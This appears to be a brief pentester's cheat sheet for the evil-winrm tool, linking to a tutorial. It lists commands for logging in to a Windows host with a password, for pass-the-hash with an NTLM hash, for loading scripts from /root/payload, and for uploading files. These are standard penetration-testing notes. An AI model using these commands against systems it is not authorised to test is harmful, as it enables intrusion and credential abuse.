https://www.hackingarticles.in/evil-winrm-winrm-pentesting-framework/

### login with creds
```
evil-winrm -i 10.10.10.10 -u administrator -p 'password'
```


---

### pass the hash
```
evil-winrm -i <ip_address> -u administrator -H <NTLM hash>
```

---
### run a command from your machine
```
evil-winrm -i <ip_address> -u administrator -p 'password' -s /root/payload
```


### commands 

`upload`